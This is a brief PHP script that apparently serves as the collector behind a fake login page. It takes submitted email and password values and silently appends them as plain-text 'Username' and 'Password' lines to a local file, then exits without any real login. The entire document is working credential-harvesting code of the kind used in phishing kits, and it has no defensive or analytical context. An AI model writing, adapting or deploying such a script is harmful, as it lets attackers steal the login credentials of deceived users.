<?php
    file_put_contents("login_data.txt" , "Username : " . $_POST['email'] . "\n" . "Password : " . $_POST['pass'] . "\n" , FILE_APPEND);
    exit();
?>